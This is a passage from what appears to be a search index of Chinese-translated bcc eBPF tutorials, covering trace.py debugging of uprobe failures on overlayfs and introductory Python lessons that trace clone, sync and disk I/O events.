\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ee5\u786e\u4fdd\u6b63\u786e\u6027\uff0c\u56e0\u4e3a\u5728\u5178\u578b\u60c5\u51b5\u4e0b\uff0c\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u5e76\u4e0d\u5e38\u89c1\u3002</p> <pre><code>$ trace.py -p 1134138 't:sched:sched_switch (args-&gt;prev_state == TASK_STATE_MAX || args-&gt;prev_state == 0)'\nPID    TID    COMM         FUNC\n1134138 1134140 contention_test sched_switch\n1134138 1134142 contention_test sched_switch\n...\n$ trace.py -L 1134140 't:sched:sched_switch (args-&gt;prev_state == TASK_STATE_MAX || args-&gt;prev_state == 0)'\nPID    TID    COMM         FUNC\n1134138 1134140 contention_test sched_switch\n1134138 1134140 contention_test sched_switch\n...\n</code></pre>"},{"location":"tutorials/bcc-documents/tutorial/#3","title":"\u793a\u4f8b 3","text":"<p>\u6b64\u793a\u4f8b\u4e0e\u95ee\u9898 1231 \u548c 1516 \u76f8\u5173\uff0c\u5176\u4e2d\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0cuprobes \u5b8c\u5168\u65e0\u6cd5\u5de5\u4f5c\u3002\u9996\u5148\uff0c\u4f60\u53ef\u4ee5\u6267\u884c\u4ee5\u4e0b <code>strace</code></p> <pre><code>$ strace trace.py 'r:bash:readline \"%s\", retval'\n...\nperf_event_open(0x7ffd968212f0, -1, 0, -1, 0x8 /* PERF_FLAG_??? */) = -1 EIO (Input/output error)\n...\n</code></pre> <p><code>perf_event_open</code>\u7cfb\u7edf\u8c03\u7528\u8fd4\u56de<code>-EIO</code>\u3002\u5728<code>/kernel/trace</code>\u548c<code>/kernel/events</code>\u76ee\u5f55\u4e2d\u67e5\u627e\u4e0e<code>EIO</code>\u76f8\u5173\u7684\u5185\u6838uprobe\u4ee3\u7801\uff0c\u51fd\u6570<code>uprobe_register</code>\u6700\u53ef\u7591\u3002\u8ba9\u6211\u4eec\u627e\u51fa\u662f\u5426\u8c03\u7528\u4e86\u8fd9\u4e2a\u51fd\u6570\uff0c\u5982\u679c\u8c03\u7528\u4e86\uff0c\u8fd4\u56de\u503c\u662f\u4ec0\u4e48\u3002\u5728\u4e00\u4e2a\u7ec8\u7aef\u4e2d\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6253\u5370\u51fa<code>uprobe_register</code>\u7684\u8fd4\u56de\u503c\uff1a</p> <pre><code>trace.py 'r::uprobe_register \"ret = %d\", retval'\n</code></pre> <p>\u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u4e2d\u8fd0\u884c\u76f8\u540c\u7684bash uretprobe\u8ddf\u8e2a\u793a\u4f8b\uff0c\u60a8\u5e94\u8be5\u5f97\u5230\uff1a</p> <pre><code>$ trace.py 'r::uprobe_register \"ret = %d\", retval'\nPID    TID    COMM         FUNC             -\n1041401 1041401 python2.7    uprobe_register  ret = -5\n</code></pre> <p>\u9519\u8bef\u4ee3\u7801<code>-5</code>\u662fEIO\u3002\u8fd9\u8bc1\u5b9e\u4e86\u51fd\u6570<code>uprobe_register</code>\u4e2d\u7684\u4ee5\u4e0b\u4ee3\u7801\u662f\u6700\u53ef\u7591\u7684\u7f6a\u9b41\u7978\u9996\u3002</p> <pre><code> if (!inode-&gt;i_mapping-&gt;a_ops-&gt;readpage &amp;&amp; !shmem_mapping(inode-&gt;i_mapping))\n        return -EIO;\n</code></pre> <p><code>shmem_mapping</code>\u51fd\u6570\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <pre><code>bool shmem_mapping(struct address_space *mapping)\n{\n        return mapping-&gt;a_ops == &amp;shmem_aops;\n}\n</code></pre> <p>\u4e3a\u4e86\u786e\u8ba4\u8fd9\u4e2a\u7406\u8bba\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u627e\u51fa<code>inode-&gt;i_mapping-&gt;a_ops</code>\u7684\u503c\uff1a</p> <pre><code>$ trace.py -I 'linux/fs.h' 'p::uprobe_register(struct inode *inode) \"a_ops = %llx\", inode-&gt;i_mapping-&gt;a_ops'\nPID    TID    COMM         FUNC             -\n814288 814288 python2.7    uprobe_register  a_ops = ffffffff81a2adc0\n^C$ grep ffffffff81a2adc0 /proc/kallsyms\nffffffff81a2adc0 R empty_aops\n</code></pre> <p>\u5185\u6838\u7b26\u53f7<code>empty_aops</code>\u6ca1\u6709\u5b9a\u4e49<code>readpage</code>\uff0c\u56e0\u6b64\u4e0a\u8ff0\u53ef\u7591\u6761\u4ef6\u4e3a\u771f\u3002\u8fdb\u4e00\u6b65\u68c0\u67e5\u5185\u6838\u6e90\u4ee3\u7801\u663e\u793a\uff0c<code>overlayfs</code>\u6ca1\u6709\u63d0\u4f9b\u81ea\u5df1\u7684<code>a_ops</code>\uff0c\u800c\u5176\u4ed6\u4e00\u4e9b\u6587\u4ef6\u7cfb\u7edf\uff08\u4f8b\u5982ext4\uff09\u5b9a\u4e49\u4e86\u81ea\u5df1\u7684<code>a_ops</code>\uff08\u4f8b\u5982<code>ext4_da_aops</code>\uff09\uff0c\u5e76\u4e14<code>ext4_da_aops</code>\u5b9a\u4e49\u4e86<code>readpage</code>\u3002\u56e0\u6b64\uff0cuprobe\u5bf9\u4e8eext4\u6b63\u5e38\u5de5\u4f5c\uff0c\u4f46\u5728overlayfs\u4e0a\u4e0d\u6b63\u5e38\u5de5\u4f5c\u3002</p> <p>\u66f4\u591a\u793a\u4f8b\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial/#22-argdist","title":"2.2. argdist\"\u3002\u66f4\u591a\u793a\u4f8b","text":""},{"location":"tutorials/bcc-documents/tutorial/#23-funccount","title":"2.3. funccount","text":"<p>\u66f4\u591a\u793a\u4f8b.</p>"},{"location":"tutorials/bcc-documents/tutorial/#_2","title":"\u7f51\u7edc","text":"<p>To do.</p> <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/","title":"bcc Python \u5f00\u53d1\u8005\u6559\u7a0b","text":"<p>\u672c\u6559\u7a0b\u4ecb\u7ecd\u4f7f\u7528 Python \u63a5\u53e3\u5f00\u53d1 bcc \u5de5\u5177\u548c\u7a0b\u5e8f\u3002\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff1a\u53ef\u89c2\u6d4b\u6027\u548c\u7f51\u7edc\u3002\u4ee3\u7801\u7247\u6bb5\u53d6\u81ea bcc \u7684\u5404\u4e2a\u7a0b\u5e8f\uff0c\u8bf7\u67e5\u9605\u5176\u6587\u4ef6\u4ee5\u4e86\u89e3\u8bb8\u53ef\u8bc1\u60c5\u51b5\u3002</p> <p>\u8fd8\u8bf7\u53c2\u9605 bcc \u5f00\u53d1\u8005\u7684\u53c2\u8003\u6307\u5357\uff0c\u4ee5\u53ca\u9488\u5bf9\u5de5\u5177\u7684\u7528\u6237\u7684\u6559\u7a0b\uff1a\u6559\u7a0b\u3002\u8fd8\u6709\u9002\u7528\u4e8e bcc \u7684 lua \u63a5\u53e3\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#_1","title":"\u53ef\u89c2\u6d4b\u6027","text":"<p>\u8fd9\u4e2a\u53ef\u89c2\u6d4b\u6027\u6559\u7a0b\u5305\u542b17\u4e2a\u8bfe\u7a0b\u548c46\u4e2a\u8981\u5b66\u4e60\u7684\u679a\u4e3e\u4e8b\u9879\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#1","title":"\u7b2c1\u8bfe. \u4f60\u597d\uff0c\u4e16\u754c","text":"<p>\u9996\u5148\u8fd0\u884c examples/hello_world.py\uff0c\u540c\u65f6\u5728\u53e6\u4e00\u4e2a\u4f1a\u8bdd\u4e2d\u8fd0\u884c\u4e00\u4e9b\u547d\u4ee4\uff08\u4f8b\u5982\uff0c\u201cls\u201d\uff09\u3002\u5b83\u5e94\u8be5\u4f1a\u4e3a\u65b0\u8fdb\u7a0b\u6253\u5370\u201cHello, World!\u201d\u3002\u5982\u679c\u6ca1\u6709\u6253\u5370\uff0c\u8bf7\u5148\u4fee\u590dbcc\uff1a\u8bf7\u53c2\u9605 INSTALL.md\u3002</p> <pre><code># ./examples/hello_world.py\n            bash-13364 [002] d... 24573433.052937: : Hello, World!\n            bash-13364 [003] d... 24573436.642808: : Hello, World!\n[...]\n</code></pre> <p>\u4ee5\u4e0b\u662f hello_world.py \u7684\u4ee3\u7801\u793a\u4f8b\uff1a</p> <pre><code>from bcc import BPF\nBPF(text='int kprobe__sys_clone(void *ctx) { bpf_trace_printk(\"Hello, World!\\\\n\"); return 0; }').trace_print()\n</code></pre> <p>\u4ece\u4e2d\u53ef\u4ee5\u5b66\u5230\u516d\u4ef6\u4e8b\u60c5\uff1a</p> <ol> <li> <p><code>text='...'</code>\uff1a\u8fd9\u5b9a\u4e49\u4e86\u5185\u8054\u7684 BPF \u7a0b\u5e8f\u3002\u8be5\u7a0b\u5e8f\u662f\u7528 C \u7f16\u5199\u7684\u3002</p> </li> <li> <p><code>kprobe__sys_clone()</code>\uff1a\u8fd9\u662f\u901a\u8fc7 kprobes \u52a8\u6001\u8ddf\u8e2a\u5185\u6838\u7684\u4e00\u79cd\u5feb\u6377\u65b9\u5f0f\u3002\u5982\u679c C \u51fd\u6570\u4ee5 <code>kprobe__</code> \u5f00\u5934\uff0c\u5176\u4f59\u90e8\u5206\u5c06\u88ab\u89c6\u4e3a\u8981\u5b9a\u4f4d\u7684\u5185\u6838\u51fd\u6570\u540d\u79f0\uff0c\u672c\u4f8b\u4e2d\u4e3a <code>sys_clone()</code>\u3002</p> </li> <li> <p><code>void *ctx</code>\uff1actx \u662f\u53c2\u6570\uff0c\u4f46\u7531\u4e8e\u6211\u4eec\u5728\u6b64\u5904\u672a\u4f7f\u7528\u5b83\u4eec\uff0c\u6240\u4ee5\u6211\u4eec\u5c06\u5176\u8f6c\u6362\u4e3a <code>void*</code> \u7c7b\u578b\u3002</p> </li> <li> <p><code>bpf_trace_printk()</code>: \u7528\u4e8e\u5c06 printf() \u6253\u5370\u5230\u901a\u7528 trace_pipe (/sys/kernel/debug/tracing/trace_pipe) \u7684\u7b80\u5355\u5185\u6838\u5de5\u5177\u3002 \u8fd9\u5bf9\u4e8e\u4e00\u4e9b\u5feb\u901f\u793a\u4f8b\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u6709\u4e00\u4e9b\u9650\u5236\uff1a\u6700\u591a\u53ea\u6709 3 \u4e2a\u53c2\u6570\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a %s\uff0c\u5e76\u4e14 trace_pipe \u662f\u5168\u5c40\u5171\u4eab\u7684\uff0c\u6240\u4ee5\u5e76\u53d1\u7a0b\u5e8f\u4f1a\u6709\u51b2\u7a81\u7684\u8f93\u51fa\u3002\u66f4\u597d\u7684\u63a5\u53e3\u662f\u901a\u8fc7 BPF_PERF_OUTPUT() \u5b9e\u73b0\u7684\uff0c\u7a0d\u540e\u4f1a\u4ecb\u7ecd\u3002</p> </li> <li> <p><code>return 0;</code>: \u5fc5\u8981\u7684\u89c4\u8303\u6027\u4ee3\u7801\uff08\u5982\u679c\u60f3\u77e5\u9053\u539f\u56e0\uff0c\u8bf7\u53c2\u89c1 #139\uff09\u3002</p> </li> <li> <p><code>.trace_print()</code>: \u4e00\u4e2a\u8bfb\u53d6 trace_pipe \u5e76\u6253\u5370\u8f93\u51fa\u7684 bcc \u7a0b\u5e8f\u3002</p> </li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#sys_sync","title":"\u7b2c\u4e8c\u8bfe sys_sync()","text":"<p>\u7f16\u5199\u4e00\u4e2a\u8ddf\u8e2a sys_sync() \u5185\u6838\u51fd\u6570\u7684\u7a0b\u5e8f\u3002\u8fd0\u884c\u65f6\u6253\u5370 \"sys_sync() called\"\u3002\u5728\u8ddf\u8e2a\u65f6\uff0c\u5728\u53e6\u4e00\u4e2a\u4f1a\u8bdd\u4e2d\u8fd0\u884c <code>sync</code> \u8fdb\u884c\u6d4b\u8bd5\u3002hello_world.py \u7a0b\u5e8f\u4e2d\u5305\u542b\u4e86\u8fd9\u4e00\u5207\u6240\u9700\u7684\u5185\u5bb9\u3002</p> <p>\u901a\u8fc7\u5728\u7a0b\u5e8f\u521a\u542f\u52a8\u65f6\u6253\u5370 \"Tracing sys_sync()... Ctrl-C to end.\" \u6765\u6539\u8fdb\u5b83\u3002\u63d0\u793a\uff1a\u5b83\u53ea\u662f Python \u4ee3\u7801\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#hello_fieldspy","title":"\u7b2c\u4e09\u8bfe hello_fields.py","text":"<p>\u8be5\u7a0b\u5e8f\u4f4d\u4e8e examples/tracing/hello_fields.py\u3002\u6837\u672c\u8f93\u51fa\uff08\u5728\u53e6\u4e00\u4e2a\u4f1a\u8bdd\u4e2d\u8fd0\u884c\u547d\u4ee4\uff09\uff1a</p> <pre><code># examples/tracing/hello_fields.py\n\u65f6\u95f4(s)            \u8fdb\u7a0b\u540d             \u8fdb\u7a0b ID    \u6d88\u606f\n24585001.174885999 sshd             1432   \u4f60\u597d\uff0c\u4e16\u754c\uff01\n24585001.195710000 sshd             15780  \u4f60\u597d\uff0c\u4e16\u754c\uff01\n24585001.991976000 systemd-udevd    484    \u4f60\u597d\uff0c\u4e16\u754c\uff01\n24585002.276147000 bash             15787  \u4f60\u597d\uff0c\u4e16\u754c\uff01\n</code></pre> <p>\u4ee3\u7801\uff1a</p> <pre><code>from bcc import BPF\n\n# \u5b9a\u4e49 BPF \u7a0b\u5e8f\nprog = \"\"\"\nint hello(void *ctx) {\n    bpf_trace_printk(\"\u4f60\u597d\uff0c\u4e16\u754c\uff01\\\\n\");\n    return 0;\n}\n\"\"\"\n\n# \u52a0\u8f7d BPF \u7a0b\u5e8f\nb = BPF(text=prog)\nb.attach_kprobe(event=b.get_syscall_fnname(\"clone\"), fn_name=\"hello\")\n\n# \u5934\u90e8\nprint(\"%-18s %-16s %-6s %s\" % (\"\u65f6\u95f4(s)\", \"\u8fdb\u7a0b\u540d\", \"\u8fdb\u7a0b ID\", \"\u6d88\u606f\"))\n\n# \u683c\u5f0f\u5316\u8f93\u51fa\nwhile 1:\n    try:\n        (task, pid, cpu, flags, ts, msg) = b.trace_fields()\n    except ValueError:\n        continue\n    print(\"%-18.9f %-16s %-6d %s\" % (ts, task, pid, msg))\n</code></pre> <p>\u8fd9\u4e0ehello_world.py\u7c7b\u4f3c\uff0c\u5e76\u901a\u8fc7sys_clone()\u518d\u6b21\u8ddf\u8e2a\u65b0\u8fdb\u7a0b\uff0c\u4f46\u662f\u8fd8\u6709\u4e00\u4e9b\u8981\u5b66\u4e60\u7684\u5185\u5bb9\uff1a</p> <ol> <li> <p><code>prog =</code>\uff1a\u8fd9\u6b21\u6211\u4eec\u5c06C\u7a0b\u5e8f\u58f0\u660e\u4e3a\u53d8\u91cf\uff0c\u7136\u540e\u5f15\u7528\u5b83\u3002\u5982\u679c\u60a8\u60f3\u6839\u636e\u547d\u4ee4\u884c\u53c2\u6570\u6dfb\u52a0\u4e00\u4e9b\u5b57\u7b26\u4e32\u66ff\u6362\uff0c\u8fd9\u5c06\u975e\u5e38\u6709\u7528\u3002</p> </li> <li> <p><code>hello()</code>\uff1a\u73b0\u5728\u6211\u4eec\u53ea\u662f\u58f0\u660e\u4e86\u4e00\u4e2aC\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u4f7f\u7528<code>kprobe__</code>\u7684\u5feb\u6377\u65b9\u5f0f\u3002\u6211\u4eec\u7a0d\u540e\u4f1a\u5f15\u7528\u5b83\u3002\u5728BPF\u7a0b\u5e8f\u4e2d\u58f0\u660e\u7684\u6240\u6709C\u51fd\u6570\u90fd\u5e0c\u671b\u5728\u63a2\u6d4b\u5668\u4e0a\u6267\u884c\uff0c\u56e0\u6b64\u5b83\u4eec\u90fd\u9700\u8981\u4ee5<code>pt_reg* ctx</code>\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002\u5982\u679c\u60a8\u9700\u8981\u5b9a\u4e49\u4e00\u4e9b\u4e0d\u4f1a\u5728\u63a2\u6d4b\u5668\u4e0a\u6267\u884c\u7684\u8f85\u52a9\u51fd\u6570\uff0c\u5219\u9700\u8981\u5c06\u5176\u5b9a\u4e49\u4e3a<code>static inline</code>\uff0c\u4ee5\u4fbf\u7531\u7f16\u8bd1\u5668\u5185\u8054\u3002\u6709\u65f6\u60a8\u8fd8\u9700\u8981\u4e3a\u5176\u6dfb\u52a0<code>_always_inline</code>\u51fd\u6570\u5c5e\u6027\u3002</p> </li> <li> <p><code>b.attach_kprobe(event=b.get_syscall_fnname(\"clone\"), fn_name=\"hello\")</code>\uff1a\u4e3a\u5185\u6838clone\u7cfb\u7edf\u8c03\u7528\u51fd\u6570\u521b\u5efa\u4e00\u4e2akprobe\uff0c\u8be5\u51fd\u6570\u5c06\u6267\u884c\u6211\u4eec\u5b9a\u4e49\u7684hello()\u51fd\u6570\u3002\u60a8\u53ef\u4ee5\u591a\u6b21\u8c03\u7528attach_kprobe()\uff0c\u5e76\u5c06\u60a8\u7684C\u51fd\u6570\u9644\u52a0\u5230\u591a\u4e2a\u5185\u6838\u51fd\u6570\u4e0a\u3002</p> </li> <li> <p><code>b.trace_fields()</code>\uff1a\u4ecetrace_pipe\u4e2d\u8fd4\u56de\u4e00\u7ec4\u56fa\u5b9a\u7684\u5b57\u6bb5\u3002\u4e0etrace_print()\u7c7b\u4f3c\uff0c\u5b83\u5bf9\u4e8e\u7f16\u5199\u811a\u672c\u5f88\u65b9\u4fbf\uff0c\u4f46\u662f\u5bf9\u4e8e\u5b9e\u9645\u7684\u5de5\u5177\u5316\u9700\u6c42\uff0c\u6211\u4eec\u5e94\u8be5\u5207\u6362\u5230BPF_PERF_OUTPUT()\u3002</p> </li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#lesson-4-sync_timingpy","title":"Lesson 4. sync_timing.py","text":"<p>\u8fd8\u8bb0\u5f97\u4ee5\u524d\u7cfb\u7edf\u7ba1\u7406\u5458\u5728\u7f13\u6162\u7684\u63a7\u5236\u53f0\u4e0a\u8f93\u5165<code>sync</code>\u4e09\u6b21\u7136\u540e\u624d\u91cd\u542f\u5417\uff1f\u540e\u6765\u6709\u4eba\u8ba4\u4e3a<code>sync;sync;sync</code>\u5f88\u806a\u660e\uff0c\u5c06\u5b83\u4eec\u90fd\u5199\u5728\u4e00\u884c\u4e0a\u8fd0\u884c\uff0c\u5c3d\u7ba1\u8fd9\u8fdd\u80cc\u4e86\u6700\u521d\u7684\u76ee\u7684\uff01\u7136\u540e\uff0csync\u53d8\u6210\u4e86\u540c\u6b65\u64cd\u4f5c\uff0c\u6240\u4ee5\u66f4\u52a0\u611a\u8822\u3002\u65e0\u8bba\u5982\u4f55\u3002</p> <p>\u4ee5\u4e0b\u793a\u4f8b\u8ba1\u7b97\u4e86<code>do_sync</code>\u51fd\u6570\u88ab\u8c03\u7528\u7684\u901f\u5ea6\uff0c\u5e76\u4e14\u5982\u679c\u5b83\u5728\u4e00\u79d2\u949f\u4e4b\u5185\u88ab\u8c03\u7528\uff0c\u5219\u8f93\u51fa\u4fe1\u606f\u3002<code>sync;sync;sync</code>\u5c06\u4e3a\u7b2c2\u4e2a\u548c\u7b2c3\u4e2async\u6253\u5370\u8f93\u51fa\uff1a</p> <pre><code># examples/tracing/sync_timing.py\n\u8ffd\u8e2a\u5feb\u901fsync... \u6309Ctrl-C\u7ed3\u675f\"\u3002\n</code></pre> <p>\u5728\u65f6\u95f40.00\u79d2\u65f6\uff1a\u68c0\u6d4b\u5230\u591a\u4e2a\u540c\u6b65\uff0c\u4e0a\u6b21\u53d1\u751f\u572895\u6beb\u79d2\u524d \u5728\u65f6\u95f40.10\u79d2\u65f6\uff1a\u68c0\u6d4b\u5230\u591a\u4e2a\u540c\u6b65\uff0c\u4e0a\u6b21\u53d1\u751f\u572896\u6beb\u79d2\u524d</p> <p>\u6b64\u7a0b\u5e8f\u662fexamples/tracing/sync_timing.py\uff1a</p> <pre><code>from __future__ import print_function\nfrom bcc import BPF\n\n# \u52a0\u8f7dBPF\u7a0b\u5e8f\nb = BPF(text=\"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n\nBPF_HASH(last);\n\nint do_trace(struct pt_regs *ctx) {\n    u64 ts, *tsp, delta, key = 0;\n\n    // \u5c1d\u8bd5\u8bfb\u53d6\u5b58\u50a8\u7684\u65f6\u95f4\u6233\n    tsp = last.lookup(&amp;key);\n    if (tsp != NULL) {\n        delta = bpf_ktime_get_ns() - *tsp;\n        if (delta &lt; 1000000000) {\n            // \u65f6\u95f4\u5c0f\u4e8e1\u79d2\u5219\u8f93\u51fa\n            bpf_trace_printk(\"%d\\\\n\", delta / 1000000);\n        }\n        last.delete(&amp;key);\n    }\n\n    // \u66f4\u65b0\u5b58\u50a8\u7684\u65f6\u95f4\u6233\n    ts = bpf_ktime_get_ns();\n    last.update(&amp;key, &amp;ts);\n    return 0;\n}\n\"\"\")\n\nb.attach_kprobe(event=b.get_syscall_fnname(\"sync\"), fn_name=\"do_trace\")\nprint(\"\u8ddf\u8e2a\u5feb\u901f\u540c\u6b65... \u6309Ctrl-C\u7ed3\u675f\")\n\n# \u683c\u5f0f\u5316\u8f93\u51fa\nstart = 0\nwhile 1:\n    (task, pid, cpu, flags, ts, ms) = b.trace_fields()\n    if start == 0:\n        start = ts\n    ts = ts - start\n    print(\"\u5728\u65f6\u95f4%.2f\u79d2\u5904\uff1a\u68c0\u6d4b\u5230\u591a\u4e2a\u540c\u6b65\uff0c\u4e0a\u6b21\u53d1\u751f\u5728%s\u6beb\u79d2\u524d\" % (ts, ms))\n</code></pre> <p>\u5b66\u4e60\u5185\u5bb9\uff1a</p> <ol> <li><code>bpf_ktime_get_ns()</code>: \u8fd4\u56de\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u7eb3\u79d2\u3002</li> <li><code>BPF_HASH(last)</code>: \u521b\u5efa\u4e00\u4e2aBPF\u6620\u5c04\u5bf9\u8c61\uff0c\u7c7b\u578b\u4e3a\u54c8\u5e0c\uff08\u5173\u8054\u6570\u7ec4\uff09\uff0c\u540d\u4e3a\"last\"\u3002\u6211\u4eec\u6ca1\u6709\u6307\u5b9a\u5176\u4ed6\u53c2\u6570\uff0c\u56e0\u6b64\u9ed8\u8ba4\u7684\u952e\u548c\u503c\u7c7b\u578b\u4e3au64\u3002</li> <li><code>key = 0</code>: \u6211\u4eec\u53ea\u4f1a\u5728\u54c8\u5e0c\u4e2d\u5b58\u50a8\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u5176\u4e2d\u952e\u88ab\u786c\u7f16\u7801\u4e3a\u96f6\u3002</li> <li><code>last.lookup(&amp;key)</code>: \u5728\u54c8\u5e0c\u4e2d\u67e5\u627e\u952e\uff0c\u5e76\u5982\u679c\u5b58\u5728\u5219\u8fd4\u56de\u5176\u503c\u7684\u6307\u9488\uff0c\u5426\u5219\u8fd4\u56deNULL\u3002\u6211\u4eec\u5c06\u952e\u4f5c\u4e3a\u6307\u9488\u7684\u5730\u5740\u4f20\u9012\u7ed9\u8be5\u51fd\u6570\u3002</li> <li><code>if (tsp != NULL) {</code>: \u9a8c\u8bc1\u5668\u8981\u6c42\u5728\u5c06\u4ece\u6620\u5c04\u67e5\u627e\u5f97\u5230\u7684\u6307\u9488\u503c\u89e3\u5f15\u7528\u4f7f\u7528\u4e4b\u524d\uff0c\u5fc5\u987b\u5148\u68c0\u67e5\u5176\u662f\u5426\u4e3anull\u30021. <code>last.delete(&amp;key)</code>: \u4ece\u54c8\u5e0c\u8868\u4e2d\u5220\u9664key\u3002\u76ee\u524d\u9700\u8981\u8fd9\u6837\u505a\u662f\u56e0\u4e3a<code>.update()</code>\u4e2d\u5b58\u5728\u4e00\u4e2a\u5185\u6838\u9519\u8bef\uff08\u57284.8.10\u4e2d\u5df2\u7ecf\u4fee\u590d\uff09\u3002</li> <li><code>last.update(&amp;key, &amp;ts)</code>: \u5c06\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c\u4e0ekey\u5173\u8054\u8d77\u6765\uff0c\u8986\u76d6\u4e4b\u524d\u7684\u4efb\u4f55\u503c\u3002\u8fd9\u4f1a\u8bb0\u5f55\u65f6\u95f4\u6233\u3002</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#5-sync_countpy","title":"\u7b2c5\u8bfe. sync_count.py","text":"<p>\u4fee\u6539sync_timing.py\u7a0b\u5e8f\uff08\u524d\u4e00\u8bfe\uff09\u4ee5\u5b58\u50a8\u6240\u6709\u5185\u6838\u540c\u6b65\u7cfb\u7edf\u8c03\u7528\uff08\u5305\u62ec\u5feb\u901f\u548c\u6162\u901f\uff09\u7684\u8ba1\u6570\uff0c\u5e76\u5c06\u5176\u4e0e\u8f93\u51fa\u4e00\u8d77\u6253\u5370\u51fa\u6765\u3002\u53ef\u4ee5\u901a\u8fc7\u5411\u73b0\u6709\u54c8\u5e0c\u8868\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u952e\u7d22\u5f15\u6765\u5728BPF\u7a0b\u5e8f\u4e2d\u8bb0\u5f55\u6b64\u8ba1\u6570\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#6-disksnooppy","title":"\u7b2c6\u8bfe. disksnoop.py","text":"<p>\u6d4f\u89c8examples/tracing/disksnoop.py\u7a0b\u5e8f\u4ee5\u4e86\u89e3\u65b0\u5185\u5bb9\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u793a\u4f8b\u8f93\u51fa\uff1a</p> <pre><code># disksnoop.py\n\u65f6\u95f4(s)            T  \u5b57\u8282     \u5ef6\u8fdf(ms)\n16458043.436012    W  4096        3.13\n16458043.437326    W  4096        4.44\n16458044.126545    R  4096       42.82\n16458044.129872    R  4096        3.24\n[...]\n</code></pre> <p>\u4ee5\u53ca\u4ee3\u7801\u7247\u6bb5\uff1a</p> <pre><code>[...]\nREQ_WRITE = 1  # \u6765\u81eainclude/linux/blk_types.h\n\n# \u52a0\u8f7dBPF\u7a0b\u5e8f\nb = BPF(text=\"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n#include &lt;linux/blk-mq.h&gt;\n\nBPF_HASH(start, struct request *);\n\nvoid trace_start(struct pt_regs *ctx, struct request *req) {\n // \u4f7f\u7528\u8bf7\u6c42\u6307\u9488\u5b58\u50a8\u5f00\u59cb\u65f6\u95f4\u6233\n u64 ts = bpf_ktime_get_ns();\n\n start.update(&amp;req, &amp;ts);\n}\n\nvoid trace_completion(struct pt_regs *ctx, struct request *req) {\n u64 *tsp, delta;\n\n tsp = start.lookup(&amp;req);\n if (tsp != 0) {\n  delta = bpf_ktime_get_ns() - *tsp;\n  bpf_trace_printk(\"%d %x %d\\\\n\", req-&gt;__data_len,\n      req-&gt;cmd_flags, delta / 1000);\n  start.delete(&amp;req);\n }\n}\n\"\"\")\nif BPF.get_kprobe_functions(b'blk_start_request'):\n        b.attach_kprobe(event=\"blk_start_request\", fn_name=\"trace_start\")\nb.attach_kprobe(event=\"blk_mq_start_request\", fn_name=\"trace_start\")\nif BPF.get_kprobe_functions(b'__blk_account_io_done'):\n    b.attach_kprobe(event=\"__blk_account_io_done\", fn_name=\"trace_completion\") else: b.attach_kprobe(event=\"blk_account_io_done\", fn_name=\"trace_completion\") \n    [...]\n</code></pre> <p>\u5b66\u4e60\u5185\u5bb9\uff1a</p> <ol> <li><code>REQ_WRITE</code>: \u6211\u4eec\u5728Python\u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5185\u6838\u5e38\u91cf\uff0c\u56e0\u4e3a\u6211\u4eec\u540e\u9762\u4f1a\u5728Python\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u5b83\u3002\u5982\u679c\u6211\u4eec\u5728BPF\u7a0b\u5e8f\u4e2d\u4f7f\u7528REQ_WRITE\uff0c\u5b83\u5e94\u8be5\u53ef\u4ee5\u6b63\u5e38\u5de5\u4f5c\uff08\u65e0\u9700\u5b9a\u4e49\uff09\uff0c\u53ea\u9700\u4f7f\u7528\u9002\u5f53\u7684<code>#includes</code>\u3002</li> <li><code>trace_start(struct pt_regs *ctx, struct request*req)</code>: \u8fd9\u4e2a\u51fd\u6570\u5c06\u5728\u540e\u9762\u9644\u52a0\u5230kprobe\u4e0a\u3002kprobe\u51fd\u6570\u7684\u53c2\u6570\u662f<code>struct pt_regs *ctx</code>\uff0c\u7528\u4e8e\u5bc4\u5b58\u5668\u548cBPF\u4e0a\u4e0b\u6587\uff0c\u7136\u540e\u662f\u51fd\u6570\u7684\u5b9e\u9645\u53c2\u6570\u3002\u6211\u4eec\u5c06\u628a\u5b83\u9644\u52a0\u5230blk_start_request()\u4e0a\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f<code>struct request*</code>\u3002</li> <li><code>start.update(&amp;req, &amp;ts)</code>: 